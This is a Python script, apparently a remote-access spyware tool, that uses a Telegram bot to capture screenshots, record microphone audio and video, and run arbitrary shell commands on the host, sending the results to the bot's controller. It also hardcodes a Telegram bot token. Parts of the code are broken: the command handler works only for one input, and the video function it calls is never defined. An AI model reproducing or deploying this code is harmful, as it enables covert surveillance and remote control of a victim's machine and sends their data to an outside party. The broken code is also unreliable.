import asyncio
import logging
import subprocess
import pyscreenshot
import wave
import pyaudio
import os
import sys
from aiogram import Bot, Dispatcher,types
from aiogram.filters.command import Command
from aiogram.types import FSInputFile
from datetime import date,datetime

sys.stdin.reconfigure(encoding='cp866')
sys.stdout.reconfigure(encoding='cp866')
sys.stderr.reconfigure(encoding='cp866')

logging.basicConfig(level=logging.INFO)
bot = Bot(token="468926798:AAHk6dSikVI2avEvh3P_tPoZwcGP9cTiymE")
dp = Dispatcher()
dp["Start_Time"] = datetime.now().strftime("%d.%m.%Y %H:%M")

def Screen():
    image = pyscreenshot.grab()
    times = date.today()
    image_name = f"Screen_{times}.png"
    image.save(image_name)
    return image_name

def SoundREC(seconds):
    record_seconds = seconds
    filename = "recorded.mp3"
    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    channels = 1
    sample_rate = 44100
    p = pyaudio.PyAudio()
    stream = p.open(format=FORMAT,
                    channels=channels,
                    rate=sample_rate,
                    input=True,
                    output=True,
                    frames_per_buffer=CHUNK)
    frames = []
    for i in range(int(44100 / CHUNK * record_seconds)):
        data = stream.read(CHUNK)
        frames.append(data)
    print("Finished recording.")
    stream.stop_stream()
    stream.close()
    p.terminate()
    wf = wave.open(filename, "wb")
    wf.setnchannels(channels)
    wf.setsampwidth(p.get_sample_size(FORMAT))
    wf.setframerate(sample_rate)
    wf.writeframes(b"".join(frames))
    wf.close()
    return filename

@dp.message(Command("Start", "start"))
async def cmd_Start(message: types.Message, Start_Time: str):
    await message.answer("hi-hi")
    await message.answer(f"TIME to Start: {Start_Time}")

@dp.message(Command("Screen", "screen"))
async def cmd_Screen(message: types.Message):
    await message.answer("hi")
    try:
        image_name = Screen()
        image_pc = FSInputFile(image_name)
        timenow = datetime.now().strftime("%H:%M:%S")
        await message.answer_photo(image_pc, caption=f"IMAGE: {timenow}")
    except TypeError:
        await message.reply("don't be shoot pleas! Bad try :(")

@dp.message(Command("CMD", "cmd"))
async def cmd_CMD(message: types.Message, command: types.BotCommand):
    if command.args is None:
        await message.answer("None Arguments")
    else:
        try:
            
            cmd = str(command.args)
            if cmd == "ifconfig" and os.name == "nt":
                cmd = "ipconfig"
                result = subprocess.run(cmd, capture_output=True, text=True, shell=True, encoding='cp866')
                
            if result.returncode == 0:
                await message.reply(f"Output:\n{result.stdout}")
            else:
                await message.reply(f"Error:\n{result.stderr}")
        except Exception as e:
            await message.reply(f"Exception: {type(e).__name__}: {e}")

@dp.message(Command("Rec", "rec"))
async def cmd_Rec(message: types.Message, command: types.BotCommand):
    try:
        if command.args is None:
            await message.reply("None accept arguments.")
        else:
             seconds = int(command.args)
             if seconds >= 101 or seconds < 1:
                    await message.reply("None accept arguments. Try <</Rec [itn(seconds)] 1-101>>")
             else:
                    filename = SoundREC(seconds)
                    recorded_file = FSInputFile(filename)
                    await message.answer_document(recorded_file)
    except Exception as e:
                    await message.reply(f"Error sending file: {type(e).__name__}: {e}")

@dp.message(Command("Video", "video"))
async def cmd_Video(message: types.Message, command: types.BotCommand):
    try:
        if command.args is None:
            await message.reply("None accept arguments.")
        else:
              duration = int(command.args)
              if duration < 1:
                        await message.reply("None accept arguments. Try <</Video [duration(seconds)]>>")
              else:
                        output_filename = 'Video'      
                        filename = VideoREC(output_filename,duration)
                        recorded_file = FSInputFile(filename)
                        await message.answer_video(recorded_file)
                        
                    
    except Exception as e:
                        await message.reply(f"Error sending file: {type(e).__name__}: {e}")

async def main():
    dp.message.register(cmd_Start, Command("Start", "start"))
    dp.message.register(cmd_Screen, Command("Screen", "screen"))
    dp.message.register(cmd_CMD, Command("CMD", "cmd"))
    dp.message.register(cmd_Rec, Command("Rec", "rec"))
    dp.message.register(cmd_Video, Command("Video", "video"))
    # dp.message.register(cmd_Info, Command("Info", "info"))
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())